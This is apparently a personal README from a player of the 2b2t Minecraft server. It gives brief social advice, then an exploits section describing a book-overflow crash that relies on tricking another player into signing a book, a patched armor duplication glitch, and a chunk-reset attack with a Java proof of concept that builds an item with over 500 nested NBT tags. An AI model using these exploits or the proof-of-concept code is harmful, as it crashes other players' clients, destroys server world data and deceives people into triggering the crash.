# What-Ive-Learned
A sum of my 2b2t experience

# People
- Treat people as humans and be honest, that goes everywhere, but just keep it in mind.

- most people are nicer than you think. give em a chance.

- Dont ask for shit, when you dont ask, people are more trusting and you come across better

# Exploits
some stuff i found or learned abt

## Book overflow
Not possible to ban. Works because you can’t send a book data packet with more than 32676 bytes of data or else it crashes, so you fill it to the brink and if someone signs or writes in it it overflows, you can get someone to do that with a social engineering prompt like that one.

## Armor dupe \[PATCHED]
https://www.youtube.com/watch?v=DKIjBQjhEJ4&t=109s
made an autodupe while it worked lol

## NBT world reset. 
only works in creative but you can artificially create an item and if it has more than 512 *nested* nbt tags you can reset the chunk its in  

POC:
```java
private ItemStack generateNBTItem() {
        try {
            ItemStack itemStack = new ItemStack(Items.STICK);
            NbtCompound rootCompound = new NbtCompound();
            NbtCompound tempCompound = rootCompound;

            // Set depth limit just above the trigger limit
            for (int i = 0; i < 516; i++) {
                NbtCompound nextCompound = new NbtCompound();
                tempCompound.put("nested" + i, nextCompound);
                tempCompound = nextCompound;
            }

            // create a deep NBTTagList to trigger the exception
            NbtList deepTagList = new NbtList();
            deepTagList.add(new NbtCompound());
            tempCompound.put("triggerList", deepTagList);

            itemStack.setNbt(rootCompound);

            return itemStack;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    ```


